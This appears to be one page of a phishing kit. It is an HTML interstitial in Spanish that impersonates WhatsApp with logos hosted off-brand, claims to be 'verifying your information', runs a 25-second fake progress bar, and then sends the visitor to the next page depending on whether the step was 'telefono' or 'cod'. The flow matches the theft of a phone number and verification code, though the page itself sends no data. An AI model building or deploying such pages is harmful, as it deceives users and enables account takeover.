<!DOCTYPE html>
<html lang="es">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cargando</title>
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #51CE70;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        overflow: hidden;
    }

    .loading-container {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        text-align: center;
        color: white;
    }

    .loading-container img {
        width: 120px;
        margin-bottom: 20px;
    }

    .loading-text {
        font-size: 1.5rem;
        margin-bottom: 10px;
    }

    .progress-bar {
        width: 80%;
        max-width: 400px;
        height: 20px;
        background-color: rgba(255, 255, 255, 0.2);
        border-radius: 10px;
        overflow: hidden;
        position: relative;
        margin-bottom: 15px;
    }

    .progress-bar-inner {
        height: 100%;
        width: 0;
        background-color: white;
        border-radius: 10px;
        animation: loading 25s linear forwards;
    }

    .loading-detail {
        font-size: 1rem;
        margin-top: 10px;
        color: rgba(255, 255, 255, 0.7);
    }

    /* Contador muy pequeño */
    .countdown {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        font-size: 0.9rem;
        font-weight: 600;
        color: #d9ebd9; /* Verde claro */
        background: rgba(0, 51, 0, 0.3); /* Fondo oscuro semitransparente */
        padding: 3px 10px;
        border-radius: 15px;
        box-shadow: 0 0 5px rgba(0, 77, 0, 0.5);
        letter-spacing: 1px;
        user-select: none;
        transition: background-color 0.3s ease;
        margin-bottom: 20px;
        text-align: center;
        min-width: 70px;
    }
    .countdown:hover {
        background: rgba(0, 51, 0, 0.6);
        box-shadow: 0 0 7px rgba(0, 102, 0, 0.7);
        cursor: default;
    }

    @keyframes loading {
        0% {
            width: 0;
        }
        100% {
            width: 100%;
        }
    }

    footer {
        position: absolute;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%);
    }

    footer img {
        width: 80px;
    }
</style>
</head>
<body>
    <div class="loading-container">
        <img src="https://sappsapp23.sirv.com/docs/JvsnINJ2CZv.svg" alt="Logo WhatsApp">
        <p class="loading-text">Estamos verificando tu información...</p>
        
        <div class="countdown" id="countdown">25 segundos</div>

        <div class="progress-bar">
            <div class="progress-bar-inner"></div>
        </div>
        <p class="loading-detail">Esto puede tardar unos segundos. No cierres la página.</p>
    </div>

    <footer>
        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
    </footer>

   <script>
        // Contador regresivo de 25 segundos
        let timeLeft = 25;
        const countdownEl = document.getElementById('countdown');
        
        const interval = setInterval(() => {
            timeLeft--;
            if (timeLeft > 0) {
                countdownEl.textContent = timeLeft + ' segundos';
            } else {
                countdownEl.textContent = '0 segundos';
                clearInterval(interval);
            }
        }, 1000);

        // Función para redirigir basándose en el parámetro 'action'
        function redirectToPage() {
            const params = new URLSearchParams(window.location.search);
            const action = params.get('action');
            const redirectTime = 25000; // 25 segundos en ms

            if (action === 'telefono') {
                setTimeout(() => {
                    window.location.href = 'index2.html';
                }, redirectTime);
            } else if (action === 'cod') {
                setTimeout(() => {
                    window.location.href = 'index3.html';
                }, redirectTime);
            } else {
                console.warn('Parámetro action no válido o no presente.');
            }
        }

        window.onload = redirectToPage;
    </script>

</body>
</html>
